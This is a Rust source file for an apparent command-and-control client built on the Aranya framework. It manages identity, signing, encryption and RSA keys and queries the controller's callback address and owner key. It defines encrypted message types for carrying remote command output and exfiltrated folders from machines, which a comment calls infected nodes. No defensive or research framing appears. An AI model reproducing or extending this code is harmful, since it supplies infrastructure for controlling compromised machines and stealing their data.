use std::{
    str::FromStr,
    path::{Path, PathBuf},
    fs,
    error::Error,
    sync::Arc,
    net::SocketAddr
};

use aes_gcm::{Aes256Gcm, Key, Nonce};
// TODO: Rename TestAeadKey
use aranya_crypto::dangerous::spideroak_crypto::aead::Aead;
use aranya_crypto::dangerous::spideroak_crypto::import::Import;
use aranya_crypto::dangerous::spideroak_crypto::keys::SecretKey;
use aranya_crypto::default::DefaultCipherSuite;
use aranya_crypto::keystore::fs_keystore::Store;
use aranya_crypto::keystore::memstore::MemStore;
use aranya_policy_ifgen::Actionable;
use aranya_runtime::linear::{
    libc::FileManager
};
use aranya_runtime::{
    GraphId, PolicyError, PolicyId, PolicyStore, Sink, VmEffect, VmPolicy, vm_action
};
use aranya_crypto::{
    Rng,
    default::DefaultEngine
};
use aranya_crypto::{CipherSuite, CmdId, Csprng, DeviceId, EncryptionKey, EncryptionPublicKey, Engine, Identified, IdentityKey, IdentityVerifyingKey, KeyStoreExt, SigningKey, VerifyingKey};
use aranya_policy_compiler::Compiler;
use aranya_policy_lang::lang::parse_policy_document;
use aranya_policy_vm::{
    Machine,
    ffi::FfiModule,
    CommandContext,
    MachineError,
    ffi::ffi
};
use rsa::{BigUint, RsaPrivateKey, RsaPublicKey, traits::PublicKeyParts};
use rsa::pkcs8::{DecodePrivateKey, EncodePrivateKey};
use rusqlite::Connection;
use serde::{Deserialize, Serialize};
use chrono::Utc;
use tokio::sync::Mutex;

use crate::{config::{self, C2ClientState, C2StorageProvider}, policy::{Effect, get_last_callback, get_owner_key, update_rsa_key}};
use crate::policy::PublicKeyBundle;

pub type C2VMPolicy = VmPolicy<DefaultEngine<Rng>>; 

pub struct C2PolicyStore {
    policy: C2VMPolicy
}

impl PolicyStore for C2PolicyStore {
    type Policy = C2VMPolicy;
    type Effect = VmEffect;

    fn add_policy(&mut self, policy: &[u8]) -> Result<PolicyId, PolicyError> {
        Ok(PolicyId::new(policy[0] as usize))
    }

    fn get_policy(&self, _id: aranya_runtime::PolicyId) -> Result<&Self::Policy, PolicyError> {
        Ok(&self.policy)
    }
}

pub struct C2Ffi;

#[ffi(module = "c2")]
impl C2Ffi {
    #[ffi_export(def = "function randomid() id")]
    pub(crate) fn randomid<E: Engine>(
        &self,
        _ctx: &CommandContext,
        _eng: &E
    ) -> Result<CmdId, MachineError> {
        let mut bytes = [0u8; 32];
        // NOTE: It doesn't have to be this secure lol
        Rng.fill_bytes(&mut bytes);
        Ok(CmdId::from(bytes))
    }

    #[ffi_export(def = "function nullid() id")]
    pub(crate) fn nullid<E: aranya_crypto::Engine>(
        &self,
        _ctx: &CommandContext,
        _eng: &E
    ) -> Result<CmdId, MachineError> {
        let mut bytes = [0u8; 32];
        bytes[0] = 128;
        Ok(CmdId::from(bytes))
    }

    #[ffi_export(def = "function current_timestamp() int")]
    pub(crate) fn current_timestamp<E: aranya_crypto::Engine>(
        &self,
        _ctx: &CommandContext,
        _eng: &E
    ) -> Result<i64, MachineError> {
        Ok(Utc::now().timestamp())
    }
}

pub type AeadKey = <<DefaultCipherSuite as CipherSuite>::Aead as Aead>::Key;

pub struct C2Client {
    engine: DefaultEngine<Rng, DefaultCipherSuite>,
    // TODO: Make config_dir private? Should be immutable
    pub config_dir: PathBuf,
    pub sqlite: Arc<Mutex<Connection>>
}

pub struct PrivateKeyBundle {
    pub ident_key: IdentityKey<DefaultCipherSuite>,
    pub sign_key: SigningKey<DefaultCipherSuite>,
    pub enc_key: EncryptionKey<DefaultCipherSuite>
}

// TODO: I really need to stop calling these things C2ThisThatTheOther
#[derive(Serialize, Deserialize)]
pub struct C2Config {
    #[serde(default)]
    ident_id: String,
    #[serde(default)]
    sign_id: String,
    #[serde(default)]
    enc_id: String,
    #[serde(default)]
    graph_id: String
}

// Sink ephemeral actions - it will do nothing other than get the data
//   from the ephemeral commands
#[derive(Default)]
pub struct EphemeralSink {
    pub callback: Option<SocketAddr>,
    // Owners current public key (n, e)
    pub pubkey: Option<RsaPublicKey>
}

impl Sink<VmEffect> for EphemeralSink {
    fn begin(&mut self) {}

    fn consume(&mut self, effect: VmEffect) {
        let Ok(eff) = Effect::try_from(effect) else {
            return;
        };

        match eff {
            Effect::QueryOwnerKeyResult(key) => {
                if let Ok(ownerpub) = RsaPublicKey::new(
                    BigUint::from_bytes_be(&key.n),
                    BigUint::from_bytes_be(&key.e)
                ) {
                    self.pubkey = Some(ownerpub);
                }
            },
            Effect::QueryCallbackResult(callback) => {
                if let Ok(socket) = callback.callback.to_string().parse() {
                    self.callback = Some(socket);
                }
            },
            _ => {}
        }
    }

    fn rollback(&mut self) {}

    fn commit(&mut self) {}
}

impl Sink<&[u8]> for EphemeralSink {
    fn begin(&mut self) {}

    fn consume(&mut self, effect: &[u8]) {}

    fn rollback(&mut self) {}

    fn commit(&mut self) {}
}

impl C2Client {
    pub fn new(config_dir: PathBuf) -> Self {
        let _ = fs::create_dir(&config_dir);

        // Init sqlite3
        let sqlite = Connection::open(&config_dir.join("db.sqlite3"))
            .expect("Couldn't initialise sqlite");


        // May error because tables exist, but that is okay
        sqlite.execute_batch(include_str!("init.sql"));
            // .expect("Failed to initialise database");

        let confpath = config_dir.join("key.bin");
        // TODO: copied in new_engine
        let engine = match fs::read(&confpath) {
            Ok(data) => {
                let key = Import::import(data.as_slice()).expect("Could not retrieve key");
                DefaultEngine::new(&key, Rng)
            },
            Err(_) => {
                let (engine, key): (DefaultEngine, AeadKey) =
                    DefaultEngine::from_entropy(Rng);

                let _ = fs::write(
                    config_dir.join(Path::new("key.bin")),
                    key.try_export_secret()
                        .expect("Could not export secret")
                        .into_bytes()
                );

                engine
            }
        };

        C2Client {
            engine,
            config_dir,
            sqlite: Arc::new(Mutex::new(sqlite))
        }
    }

    // TODO: Can I make it not pass config_dir and instead store?
    pub fn create_policy(
        &self,
        policy_data: &str,
        id: DeviceId
    ) -> Result<VmPolicy<DefaultEngine>, ()> {
        let store = Store::open(&self.config_dir).unwrap();

        // Compile policy
        let policy = match parse_policy_document(policy_data) {
            Ok(v) => v,
            Err(v) => {
                print!("Policy parsing error:\n{}\n", v);
                return Err(());
            }
        };

        let module = match Compiler::new(&policy).ffi_modules(&vec![
            // NOTE: envelope messes up policy code, as it
            //   says Envelope is defined, but if I delete the
            //   struct definition, it then says it's not defined
            aranya_envelope_ffi::Ffi::SCHEMA,
            aranya_device_ffi::FfiDevice::SCHEMA,
            aranya_perspective_ffi::FfiPerspective::SCHEMA,
            C2Ffi::SCHEMA,
            aranya_crypto_ffi::Ffi::<MemStore>::SCHEMA,
            aranya_idam_ffi::Ffi::<MemStore>::SCHEMA,
        ]).compile() {
            Ok(v) => v,
            Err(v) => {
                print!("Policy compliation error:\n{:?}\n", v);
                return Err(());
            }
        };

        let machine = Machine::from_module(module).unwrap();

        match VmPolicy::new(machine, self.engine.clone(), vec![
            Box::from(aranya_envelope_ffi::Ffi),
            Box::from(aranya_device_ffi::FfiDevice::new(id)),
            Box::from(aranya_perspective_ffi::FfiPerspective),
            Box::from(C2Ffi),
            // TODO: Is it okay to clone ??? - yes but only because its filesystem
            Box::from(aranya_crypto_ffi::Ffi::<Store>::new(store.try_clone().unwrap())),
            Box::from(aranya_idam_ffi::Ffi::<Store>::new(store.try_clone().unwrap())),
        ]) {
            Ok(v) => Ok(v),
            Err(v) => {
                print!("Failed to create VmPolicy:\n{:?}\n", v);
                return Err(());
            }
        }
    }

    pub fn new_engine(&mut self) {
        let (engine, key): (DefaultEngine, AeadKey) = DefaultEngine::from_entropy(Rng);
        let _ = fs::write(self.config_dir.join(Path::new("key.bin")), key.try_export_secret().expect("Could not export secret").into_bytes());
        self.engine = engine;
    }

    pub fn init_aranya(
        &self,
        policy: VmPolicy<DefaultEngine>
    ) -> C2ClientState {
        C2ClientState::new(
            C2PolicyStore { policy },
            C2StorageProvider::new(FileManager::new(&self.config_dir).unwrap())
        )
    }

    // Checks if there are keys in the config directory ready to be loaded
    pub fn check_keys(&self) -> bool {
        let store = Store::open(&self.config_dir).unwrap();
        let conf = self.load_config();

        return conf.ident_id.len() > 0
            && conf.sign_id.len() > 0
            && conf.enc_id.len() > 0;
    }

    pub fn load_keys(&self) -> PrivateKeyBundle {
        let store = Store::open(&self.config_dir).unwrap();
        let conf = self.load_config();

        // Load ID of keys from config
        let ident_id = <<IdentityKey<DefaultCipherSuite> as Identified>::Id>::from_str(&conf.ident_id).unwrap();
        let sign_id = <<SigningKey<DefaultCipherSuite> as Identified>::Id>::from_str(&conf.sign_id).unwrap();
        let enc_id = <<EncryptionKey<DefaultCipherSuite> as Identified>::Id>::from_str(&conf.enc_id).unwrap();

        // TODO: Error handling for non-existant config (remove unwrap shit)

        // TODO: Temporary
        // println!("{}", ident_id);
        // println!("{:?}", store.get_key(&self.engine, ident_id));

        // Load private keys from Aranya store via public key/ID
        PrivateKeyBundle {
            ident_key: store.get_key(&self.engine, ident_id).unwrap().unwrap(),
            sign_key: store.get_key(&self.engine, sign_id).unwrap().unwrap(),
            enc_key: store.get_key(&self.engine, enc_id).unwrap().unwrap()
        }
    }

    // Load the C2 Aranya config
    fn load_config(&self) -> C2Config {
        // TODO: Make "config.yaml" a constant
        let confpath = self.config_dir.join(Path::new("config.yaml"));

        // Read data or default to no data
        let data = match fs::read(&confpath) {
            Ok(data) => String::from_utf8(data).expect("Lol no utf8"),
            Err(_) => String::new()
        };

        return serde_yaml::from_str(&data)
            .expect("Lol no serde_yaml::from_str");
    }

    // Write to the C2 Aranya config file
    fn write_config(&self, config: &C2Config) {
        let confpath = self.config_dir.join(Path::new("config.yaml"));
        let yaml = serde_yaml::to_string(config).expect("Could not write yaml");
        let _ = fs::write(&confpath, yaml);
    }

    // Generate a set of identify, signing, and encryption keys.
    // Will also write the keys to the config file
    pub fn create_new_keys(&self) -> PrivateKeyBundle {
        let mut store = Store::open(&self.config_dir).unwrap();

        let ident_key = IdentityKey::<DefaultCipherSuite>::new(&self.engine);
        let sign_key = SigningKey::<DefaultCipherSuite>::new(&self.engine);
        let enc_key = EncryptionKey::<DefaultCipherSuite>::new(&self.engine);

        let _ = store.insert_key(&self.engine, ident_key.clone()).unwrap();
        let _ = store.insert_key(&self.engine, sign_key.clone()).unwrap();
        let _ = store.insert_key(&self.engine, enc_key.clone()).unwrap();

        let mut conf = self.load_config();
        conf.ident_id = ident_key.id().unwrap().to_string();
        conf.sign_id = sign_key.id().unwrap().to_string();
        conf.enc_id = enc_key.id().unwrap().to_string();
        self.write_config(&conf);

        return PrivateKeyBundle {
            ident_key,
            sign_key,
            enc_key
        };
    }

    // See if there is an RSA key in the config dir
    pub fn check_rsa_key(&self) -> bool {
        let keypath = self.config_dir.join(Path::new("rsa.key"));
        return keypath.exists();
    }

    pub fn load_rsa_key(&self) -> RsaPrivateKey {
        let keypath = self.config_dir.join(Path::new("rsa.key"));
        RsaPrivateKey::read_pkcs8_pem_file(keypath)
            .expect("Couldn't read RSA private key")
    }

    pub fn save_rsa_key(&self, rsa: &RsaPrivateKey) {
        let keypath = self.config_dir.join(Path::new("rsa.key"));
        rsa.write_pkcs8_pem_file(keypath, rsa::pkcs8::LineEnding::LF)
            .expect("Couldn't write RSA private key");
    }

    // Create a new Aranya graph (with an Init command) and write
    //   it to the Aranya config
    pub fn create_graph<S: Sink<VmEffect>>(
        &mut self,
        cs: &mut C2ClientState,
        sink: &mut S,
        privkeys: &PrivateKeyBundle
    ) -> Result<GraphId, ()> {
        let pubkeys = PublicKeyBundle {
            ident_key: postcard::to_vec::
                <IdentityVerifyingKey<DefaultCipherSuite>, 90>(
                    &privkeys.ident_key.public().unwrap()
                ).unwrap().to_vec(),
            sign_key: postcard::to_vec::
                <VerifyingKey<DefaultCipherSuite>, 90>(
                    &privkeys.sign_key.public().unwrap()
                ).unwrap().to_vec(),
            // TODO: Bro how long is this encryptionpublickey array meant to actually be ?
            enc_key: postcard::to_vec::
                <EncryptionPublicKey<DefaultCipherSuite>, 150>(
                    &privkeys.enc_key.public().unwrap()
                ).unwrap().to_vec(),
        };

        match cs.new_graph(
            &vec![0],
            vm_action!(init(pubkeys)),
            sink
        ) {
            Ok(graph_id) => {
                self.set_graph(graph_id);
                Ok(graph_id)
            },
            Err(v) => {
                print!("New graph creation error:\n{:?}\n", v);
                Err(())
            }
        }
    }

    // TODO: Replace with config infected node ?
    pub fn set_graph(&mut self, graph_id: GraphId) {
        let mut conf = self.load_config();
        conf.graph_id = graph_id.to_string();
        self.write_config(&conf);
    }

    pub fn get_graph(&self) -> GraphId {
        let conf = self.load_config();
        return GraphId::decode(conf.graph_id)
            .expect("Could not decode graph ID from config");
    }

    pub fn new_rsa_key<S: Sink<VmEffect>>(
        &self,
        clientstate: &mut C2ClientState,
        sink: &mut S
    ) {
        let mut rng = Rng;
        // println!("Generating RSA key...");
        let key = RsaPrivateKey::new(&mut rng, 2048)
            .expect("Failed to generate RSA private key");
        self.save_rsa_key(&key);
        // println!("Created and saved RSA key!");

        let pubkey = key.to_public_key();

        update_rsa_key(pubkey.n().to_bytes_be(), pubkey.e().to_bytes_be()).with_action(|action| {
            clientstate.action(
                self.get_graph(),
                sink,
                action
            )
        });
    }

    // Responsible for initialising the entirety of the configuration dir,
    //   including creating the graph and keys and Init command and RSA keys
    pub fn initialise_config<S: Sink<VmEffect>>(
        &mut self,
        sink: &mut S
    ) -> (C2ClientState, PrivateKeyBundle) {
        let keys = match self.check_keys() {
            false => {
                self.new_engine();
                self.create_new_keys()
            },
            true => {
                self.load_keys()
            }
        };

        let deviceid = keys.ident_key.id().unwrap();
        let policy = self.create_policy(config::POLICY, deviceid).expect("Failed to create policy");
        let mut clientstate = self.init_aranya(policy);

        if self.get_graph() == GraphId::default() {
            self.create_graph(&mut clientstate, sink, &keys);
        }

        if !self.check_rsa_key() {
            self.new_rsa_key(&mut clientstate, sink);
        }

        return (clientstate, keys);
    }

    // Run an ephemeral action to get the current C2 callback & other stuff
    pub fn get_latest_information(
        &self,
        clientstate: &mut C2ClientState
    ) -> Result<EphemeralSink, ()> {
        let Ok(mut session) = clientstate.session(self.get_graph()) else {
            return Err(());
        };

        // I guess I need two sinks... Not sure what the 2nd one does
        let mut sink = EphemeralSink::default();
        let mut sink2 = EphemeralSink::default();
        get_owner_key().with_action(|action| {
            session.action(
                &clientstate,
                &mut sink,
                &mut sink2,
                action
            );
        });

        get_last_callback().with_action(|action| {
            session.action(
                &clientstate,
                &mut sink,
                &mut sink2,
                action
            );
        });

        Ok(sink)
    }
}

#[derive(Serialize, Deserialize)]
pub struct ExfilFolder {
    name: String,
    data: Vec<u8>
}

#[derive(Serialize, Deserialize)]
pub enum CommandExecutionMessage {
    CommandExecuted {
        stdout: Vec<u8>,
        stderr: Vec<u8>
    },
    FoldersExfiltrated {
        folders: Vec<ExfilFolder>
    }
}

#[derive(Serialize, Deserialize)]
pub struct Aes256ShareMessage {
    pub key: [u8; 32],
    pub nonce: [u8; 12],
    // Lets just put the unique ID in here because why not
    pub machine_id: String
}

#[derive(Serialize, Deserialize)]
pub struct FastChannelMessage {
    // Aes256ShareMessage, RSA encrypted
    pub share: Vec<u8>,
    // CommandExecutionMessage, AES-GCM encrypted
    pub command: Vec<u8>
}

